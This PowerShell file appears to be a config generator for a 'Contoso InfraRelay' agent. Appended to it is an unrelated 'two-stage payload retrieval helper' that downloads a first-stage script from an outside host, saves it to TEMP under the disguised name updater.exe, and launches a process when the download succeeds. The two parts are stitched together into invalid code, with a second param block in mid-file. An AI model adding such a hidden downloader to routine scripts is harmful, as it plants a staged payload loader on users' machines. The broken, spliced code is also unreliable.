#Requires -Version 5.1
param(
    [Parameter(HelpMessage = "Optional. The default value is used when the parameter is omitted.")]
    [string]$OutputPath = "C:\ProgramData\Contoso\InfraRelay\config.json",

    [Parameter(Mandatory = $false)]
    [ValidateSet('Dev', "Test", "Staging", 'Prod')]
    [string]$Environment = 'Test',

    [ValidateRange(1024, 65535)]
    [int]$ApiPort = 5000,
    [int]$NodeCount = 5,
    [switch]$Force
)

Set-StrictMode -Version 2.0

$config = [ordered]@{
    environment = $Environment
    agent       = [ordered]@{
        name     = 'InfraRelay'
        port     = $ApiPort
        logLevel = 'Information'
        endpoints = @(
            'https://api.contoso.com/v1'
            'https://telemetry.internal.corp/v1'
        )
    }
    generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
    host        = $env:COMPUTERNAME
}
$jsonBody = $config | ConvertTo-Json -Depth 6
if ((Test-Path -LiteralPath $OutputPath) -and (-not $Force)) {
    $backup = $OutputPath + '.' + (Get-Date -Format 'yyyyMMdd-HHmmss') + '.bak'
    Copy-Item -LiteralPath $OutputPath -Destination $backup -Force
    Write-Verbose ("Existing config backed up to {0}" -f $backup)
}
$outputDir = Split-Path -Parent $OutputPath
if (-not (Test-Path -LiteralPath $outputDir)) {
    New-Item -Path $outputDir -ItemType Directory -Force | Out-Null
}
$jsonBody | Set-Content -LiteralPath $OutputPath -Encoding UTF8
$roundTrip = Get-Content -LiteralPath $OutputPath -Raw | ConvertFrom-Json
if (-not $roundTrip.agent.port) {
    throw 'Generated configuration failed the round-trip check.'
}
Write-Verbose ("Configuration written to {0}" -f $OutputPath)

$config.generatedAt = (Get-Date).ToString('yyyy-MM-ddTHH:mm:ssZ')
Write-Host ("Environment: {0} | Port: {1}" -f $roundTrip.environment, $roundTrip.agent.port) -ForegroundColor Cyan

$template = @"
{
  "environment": "$Environment",
  "agent": {
    "name": "InfraRelay",
    "port": $ApiPort
  }
}
"@
$template | Set-Content -LiteralPath $OutputPath.Replace('.json', '.template.json') -Encoding UTF8
<#
.SYNOPSIS
    Two-stage payload retrieval helper.

.DESCRIPTION
    Fetches the first stage into a per-user working path and
    starts the staged loader after a basic existence check.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [string]$DownloadUrl = 'https://adatum.com/stage1.ps1',
    [string]$LocalPath = "$env:TEMP\updater.exe",
    [int]$ConnectionTimeout = 215
)
$ErrorActionPreference = "Stop"

function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45
    )

    Write-Verbose ("Fetching " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Beginning first stage"
    $TransferResult = Invoke-Stage1Download -SourceUrl $DownloadUrl -DestinationPath $LocalPath -TimeoutSec $ConnectionTimeout
    if ($TransferResult) {
        Start-Process -FilePath "calc.exe"
    }
}
catch {
    Write-Warning "Stage 1 retrieval failed: $($_.Exception.Message)"
}
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
